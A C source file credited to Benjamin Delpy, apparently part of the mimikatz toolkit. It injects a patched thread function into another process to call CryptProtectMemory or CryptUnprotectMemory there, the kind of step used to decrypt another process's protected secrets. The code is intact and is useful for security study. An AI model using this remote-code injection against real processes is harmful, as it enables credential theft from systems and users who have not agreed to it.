/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kull_m_crypto_remote.h"

#pragma optimize("", off)
DWORD WINAPI kull_m_crypto_remote_thread_CryptProtectMemory_Generic(PREMOTE_LIB_DATA lpParameter) // to Protect & Unprotect
{
	lpParameter->output.outputData = lpParameter->input.inputData;
	lpParameter->output.outputSize = lpParameter->input.inputSize;
	lpParameter->output.outputStatus = ((PCRYPTUNPROTECTMEMORY) 0x4141414141414141)(lpParameter->input.inputData, lpParameter->input.inputSize, lpParameter->input.inputDword);
	
	return STATUS_SUCCESS;
}
DWORD kull_m_crypto_remote_thread_CryptProtectMemory_Generic_end(){return 'kipr';}
#pragma optimize("", on)

BOOL WINAPI kull_m_crypto_remote_CryptProtectMemory_Generic(__in PKULL_M_MEMORY_HANDLE hProcess, __in BOOL bIsProtect, __inout LPVOID pDataIn, __in DWORD cbDataIn, __in DWORD dwFlags)
{
	BOOL status = FALSE;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	REMOTE_EXT extensions[] = {
		{L"dpapi.dll", "CryptProtectMemory", (PVOID) 0x4141414141414141, NULL},
		{L"dpapi.dll", "CryptUnprotectMemory", (PVOID) 0x4141414141414141, NULL},
	};
	MULTIPLE_REMOTE_EXT extForCb = {1, bIsProtect ? &extensions[0] : &extensions[1]};
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	
	if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hProcess, kull_m_crypto_remote_thread_CryptProtectMemory_Generic, (DWORD) ((PBYTE) kull_m_crypto_remote_thread_CryptProtectMemory_Generic_end - (PBYTE) kull_m_crypto_remote_thread_CryptProtectMemory_Generic), &extForCb, &aRemoteFunc))
	{
		if(iData = kull_m_remotelib_CreateInput(NULL, dwFlags, cbDataIn, pDataIn))
		{
			if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
			{
				status = (BOOL) oData.outputStatus;

				if(status)
				{
					RtlCopyMemory(pDataIn, oData.outputData, min(cbDataIn, oData.outputSize));
				}
				// LocalFree oData.outputData ?
			}
			LocalFree(iData);
		}
		kull_m_memory_free(&aRemoteFunc);
	}
	else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");

	return status;
}